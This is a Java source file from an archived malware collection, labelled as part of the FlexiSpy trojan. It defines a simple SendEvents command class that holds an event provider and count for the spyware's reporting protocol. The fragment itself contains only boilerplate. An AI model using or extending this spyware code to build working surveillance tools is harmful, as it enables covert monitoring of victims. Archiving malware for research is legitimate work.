/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.prot.command;

import com.vvt.prot.CommandCode;
import com.vvt.prot.CommandData;
import com.vvt.prot.DataProvider;

public class SendEvents implements CommandData {

	private DataProvider eventDataProvider;
	private int count;
	
	public void addEventIterator(DataProvider eventDataProvider) {
		this.eventDataProvider = eventDataProvider;
	}
	
	public DataProvider getEventIterator() {
		return eventDataProvider;
	}
	
	public int getEventCount() {
		return count;	
	}
	
	public void setEventCount(int count) {
		this.count = count;
	}
	
	public CommandCode getCommand() {
		return CommandCode.SEND_EVENTS;
	}
	
}
